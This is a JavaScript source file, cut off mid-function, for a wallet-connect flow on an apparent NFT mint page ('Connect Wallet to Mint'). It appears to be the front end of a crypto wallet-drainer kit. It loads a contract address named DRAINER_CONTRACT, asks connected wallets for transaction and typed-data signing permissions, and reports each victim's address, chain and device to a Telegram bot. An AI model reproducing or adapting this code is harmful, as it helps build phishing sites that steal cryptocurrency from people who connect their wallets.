// ============================================================================
//  main.js — Production wallet connect flow
//
//  KEY DESIGN DECISIONS
//  ────────────────────
//  1. Every async step has a HARD TIMEOUT. No step can hang the flow.
//  2. connectWallet() NEVER throws — always returns a typed result.
//  3. Web3 is loaded ONCE at boot (avoids mid-connect dynamic import stalls).
//  4. Global watchdog resets the button if nothing changes for 45 seconds.
//  5. Direct EVM runs on desktop AND mobile (some mobile browsers inject).
//  6. WalletConnect runs only if direct fails AND isn't in "rejected" state.
//  7. Publish global state with the CORRECT provider BEFORE UI update.
// ============================================================================

import { CONFIG } from './config.js';

;(async function () {
  /* ============================================================
   *  0. HARD TIMEOUT HELPER — the core of the outside-the-box fix
   * ============================================================
   * Any async function can be wrapped in `withTimeout(promise, ms, label)`.
   * If the promise doesn't resolve in `ms`, the wrapper rejects with a
   * labelled timeout error. This is what stops "Connecting..." hangs.
   */
  function withTimeout(promise, ms, label = 'operation') {
    let timer;
    const timeout = new Promise((_, reject) => {
      timer = setTimeout(() => {
        const err = new Error(`${label} timed out after ${ms}ms`);
        err.__timeout = true;
        reject(err);
      }, ms);
    });
    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
  }

  // Safe wrapper: never throws, always returns { ok, value } or { ok:false, error }
  async function safe(label, fn, timeoutMs) {
    try {
      const p = fn();
      const value = timeoutMs ? await withTimeout(p, timeoutMs, label) : await p;
      return { ok: true, value };
    } catch (err) {
      logDebug(`⚠️ ${label} failed: ${err.message}`);
      return { ok: false, error: err };
    }
  }

  /* ============================================================
   *  1. DEBUG PANEL
   * ============================================================ */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    try { console.log('[main]', msg); } catch (e) {}
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ============================================================
   *  2. PLATFORM
   * ============================================================ */
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ============================================================
   *  3. TELEGRAM
   * ============================================================ */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await withTimeout(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
        }),
        8000,
        'telegram'
      );
      const result = await r.json();
      return r.ok && result.ok !== false;
    } catch (e) {
      console.error('Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ============================================================
   *  4. WEBSOCKET CHECK (mobile only)
   * ============================================================ */
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) { logDebug('⏭️ Skipping WS check on desktop'); return true; }
    for (let i = 0; i < retries; i++) {
      const ok = await new Promise((resolve) => {
        let settled = false;
        const done = (v) => { if (!settled) { settled = true; resolve(v); } };
        try {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { try { ws.close(); } catch (e) {} done(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (e) {} done(true); };
          ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (e) {} done(false); };
        } catch (e) { done(false); }
      });
      if (ok) return true;
      await new Promise((r) => setTimeout(r, delay));
    }
    return true; // proceed anyway
  }

  /* ============================================================
   *  5. LIBRARY LOADING (with CDN fallback)
   * ============================================================ */
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of cdns) {
      const r = await safe(`SignClient from ${url}`, () => import(url), 15000);
      if (r.ok) { SignClient = r.value.default || r.value; logDebug(`✅ SignClient from ${url}`); break; }
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      const r = await safe(`WalletConnectModal from ${url}`, () => import(url), 15000);
      if (r.ok) { WalletConnectModal = r.value.WalletConnectModal || r.value.default || r.value; logDebug(`✅ WalletConnectModal from ${url}`); break; }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      const r = await safe(`EthereumProvider from ${url}`, () => import(url), 15000);
      if (r.ok) { EthereumProvider = r.value.EthereumProvider || r.value.default || r.value; logDebug(`✅ EthereumProvider from ${url}`); break; }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  /* ============================================================
   *  6. DOM + STATE
   * ============================================================ */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  let claimStatus     = document.getElementById('claimStatus');

  if (!claimStatus && connectButton) {
    claimStatus = document.createElement('div');
    claimStatus.id = 'claimStatus';
    connectButton.parentNode.appendChild(claimStatus);
  }

  let currentSession = null;
  let client, modal, SignClient, WalletConnectModal, EthereumProvider;
  let Web3Ctor = null;              // loaded ONCE at boot
  let web3Instance = null;
  let contractInstance = null;
  let activeProvider = null;
  let isConnecting = false;

  /* ============================================================
   *  7. GLOBAL WATCHDOG
   *  If we enter "loading" and nothing changes in 45s, reset.
   * ============================================================ */
  let watchdogTimer = null;
  function armWatchdog() {
    disarmWatchdog();
    watchdogTimer = setTimeout(() => {
      logDebug('🛑 WATCHDOG: connect flow hung — resetting UI');
      isConnecting = false;
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      showStatus('Connection timed out. Please try again.', 'error');
    }, 45000);
  }
  function disarmWatchdog() {
    if (watchdogTimer) { clearTimeout(watchdogTimer); watchdogTimer = null; }
  }

  /* ============================================================
   *  8. UI STATE
   * ============================================================ */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' }
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { if (claimStatus) claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ============================================================
   *  9. CONFIG
   * ============================================================ */
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG;
  let projectId = PROJECT_ID;

  /* ============================================================
   *  10. STORAGE
   * ============================================================ */
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) localStorage.setItem('chainType', chainType);
    } catch (e) {}
  }
  function getSavedWallet()    { try { return localStorage.getItem('connectedWallet'); } catch (e) { return null; } }
  function getSavedSession()   { try { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; } catch (e) { return null; } }
  function getSavedChainType() { try { return localStorage.getItem('chainType') || 'unknown'; } catch (e) { return 'unknown'; } }
  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
    } catch (e) {}
  }

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  /* ============================================================
   *  11. GLOBAL STATE PUBLISHER
   * ============================================================ */
  function publishGlobalState(address, chain) {
    const live = activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now()
    };
    console.log('[main] published window.__apexConnected', {
      address, chain,
      hasWeb3: !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live
    });
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ============================================================
   *  12. UI UPDATE
   * ============================================================ */
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  /* ============================================================
   *  13. PROVIDER DISCOVERY (unified)
   * ============================================================ */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d?.info || !d?.provider) return;
      const key = d.info.uuid || `${d.info.rdns}|${d.info.name}`;
      if (!evmProviders.some((p) => (p.info.uuid || `${p.info.rdns}|${p.info.name}`) === key)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
      }
    });

    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
    setTimeout(request, 3000);
  }

  function collectEVMProviders() {
    const seen = new Set();
    const list = [];

    const push = (info, provider, uniqueId) => {
      if (!provider) return;
      const key = uniqueId || info.uuid || `${info.rdns}|${info.name}`;
      if (seen.has(key)) return;
      seen.add(key);
      list.push({ info, provider });
    };

    // 1. EIP-6963 announced providers
    for (const p of evmProviders) push(p.info, p.provider);

    // 2. Legacy multi-provider shim
    if (window.ethereum?.providers && Array.isArray(window.ethereum.providers)) {
      for (let i = 0; i < window.ethereum.providers.length; i++) {
        const p = window.ethereum.providers[i];
        let name = 'Injected', rdns = 'io.injected';
        if (p.isMetaMask)            { name = 'MetaMask'; rdns = 'io.metamask'; }
        else if (p.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
        else if (p.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
        else if (p.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
        else if (p.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
        push({ uuid: `${rdns}-legacy-${i}`, name, rdns, icon: '' }, p, `legacy-${i}`);
      }
    }

    // 3. Phantom EVM
    if (window.phantom?.ethereum) {
      push({ uuid: 'phantom-evm', name: 'Phantom (EVM)', rdns: 'app.phantom', icon: '' },
        window.phantom.ethereum, 'phantom-evm');
    }

    // 4. Plain window.ethereum fallback
    if (window.ethereum) {
      let name = 'Injected', rdns = 'io.injected';
      if (window.ethereum.isMetaMask)            { name = 'MetaMask'; rdns = 'io.metamask'; }
      else if (window.ethereum.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
      else if (window.ethereum.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
      else if (window.ethereum.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
      else if (window.ethereum.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
      else if (window.ethereum.isPhantom)        { name = 'Phantom (EVM)'; rdns = 'app.phantom'; }
      push({ uuid: `${rdns}-direct`, name, rdns, icon: '' }, window.ethereum, 'direct');
    }

    return list;
  }

  /* ============================================================
   *  14. WALLET PICKER
   * ============================================================ */
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const box = document.createElement('div');
    box.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    box.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    const list = box.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    box.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ============================================================
   *  15. WALLETCONNECT INIT
   * ============================================================ */
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;
    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test ID'); }
    await checkWebSocket(1, 500);

    const r = await safe('WalletConnect init', async () => {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com'
      });
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937'
        },
        enableExplorer: true
      });
      return true;
    }, 20000);

    if (!r.ok) { logDebug('WC init failed: ' + (r.error?.message || 'unknown')); return false; }
    logDebug('✅ WalletConnect init OK');
    return true;
  }

  /* ============================================================
   *  16. DIRECT EVM CONNECT — hard-timeout-protected
   * ============================================================
   *  Returns:
   *    { status: 'connected', address, provider }
   *    { status: 'rejected' }     → user rejected
   *    { status: 'unavailable' }  → no providers found
   *    { status: 'failed', error }→ any other failure
   */
  async function connectDirectEVM(totalTimeoutMs = 12000) {
    setupEIP6963();

    // Give EIP-6963 a moment (max 1.5s)
    await new Promise((r) => setTimeout(r, 1500));

    const all = collectEVMProviders();
    if (all.length === 0) {
      logDebug('No injected EVM providers found');
      return { status: 'unavailable' };
    }

    logDebug(`Found ${all.length} EVM provider(s): ${all.map((p) => p.info.name).join(', ')}`);

    // Selection
    let chosen = null;
    const metaMask = all.find((p) => p.info.rdns === 'io.metamask');
    if (metaMask) {
      chosen = metaMask;
    } else if (all.length === 1) {
      chosen = all[0];
    } else {
      // Multiple non-MetaMask wallets: show picker (with its own timeout)
      const picked = await safe('Wallet picker', () => new Promise((res) => showWalletSelectionModal(all, res)), 60000);
      if (!picked.ok || !picked.value) return { status: 'unavailable' };
      chosen = picked.value;
    }

    const provider = chosen.provider;
    logDebug(`Requesting accounts from ${chosen.info.name}...`);

    const req = await safe(
      `eth_requestAccounts on ${chosen.info.name}`,
      () => provider.request({ method: 'eth_requestAccounts' }),
      totalTimeoutMs
    );

    if (!req.ok) {
      const e = req.error;
      if (e?.code === 4001) return { status: 'rejected' };
      return { status: 'failed', error: e };
    }

    const accounts = req.value;
    if (!accounts?.length) return { status: 'failed', error: new Error('no accounts') };

    const address = accounts[0];

    // Load Web3 if not already loaded
    if (!Web3Ctor) {
      const wr = await safe('load web3', async () => (await import('web3')).default, 10000);
      if (!wr.ok) return { status: 'failed', error: wr.error };
      Web3Ctor = wr.value;
    }

    activeProvider = provider;
    web3Instance = new Web3Ctor(provider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

    saveWallet(address, null, 'evm');
    setupEVMProviderEvents(provider);
    updateConnectedUI(address, 'evm');

    logDebug(`✅ Direct EVM connected via ${chosen.info.name}: ${address}`);
    return { status: 'connected', address, provider };
  }

  /* ============================================================
   *  17. WALLETCONNECT EVM CONNECT — hard-timeout-protected
   * ============================================================ */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return { status: 'busy' };
    isConnecting = true;

    try {
      const initOk = await initWalletConnect(useTestId);
      if (!initOk) { isConnecting = false; return { status: 'failed', error: new Error('WC init failed') }; }

      if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }

      showStatus('Requesting connection...', 'info');

      const connectRes = await safe(
        'client.connect',
        () => client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
              chains: ['eip155:1'],
              events: ['chainChanged', 'accountsChanged']
            }
          }
        }),
        30000
      );

      if (!connectRes.ok) {
        isConnecting = false;
        return { status: 'failed', error: connectRes.error };
      }

      const { uri, approval } = connectRes.value;
      if (!uri) { isConnecting = false; return { status: 'failed', error: new Error('No URI') }; }

      modal.openModal({ uri });
      showStatus('Scan the QR code', 'info');
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      const approvalRes = await safe('approval', () => approval(), timeoutMs);

      try { if (modal) modal.closeModal(); } catch (e) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!approvalRes.ok) {
        isConnecting = false;
        return { status: 'failed', error: approvalRes.error };
      }

      const session = approvalRes.value;
      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        return { status: 'failed', error: new Error('No accounts in session') };
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      // Try EthereumProvider
      let provider = null;
      const providerRes = await safe(
        'EthereumProvider.init',
        () => EthereumProvider.init({ projectId, metadata: DAPP_METADATA, session }),
        15000
      );
      if (providerRes.ok) provider = providerRes.value;
      else if (isDesktop() && window.ethereum) {
        logDebug('Falling back to window.ethereum for the WC session');
        provider = window.ethereum;
      } else {
        isConnecting = false;
        return { status: 'failed', error: providerRes.error };
      }

      // Load Web3 if needed
      if (!Web3Ctor) {
        const wr = await safe('load web3', async () => (await import('web3')).default, 10000);
        if (!wr.ok) { isConnecting = false; return { status: 'failed', error: wr.error }; }
        Web3Ctor = wr.value;
      }

      activeProvider = provider;
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(account, session, 'evm');
      setupEVMProviderEvents(provider);
      updateConnectedUI(account, 'evm');

      isConnecting = false;
      logDebug(`✅ WalletConnect connected: ${account}`);
      return { status: 'connected', address: account, provider };
    } catch (e) {
      try { if (modal) modal.closeModal(); } catch (_) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      isConnecting = false;
      return { status: '
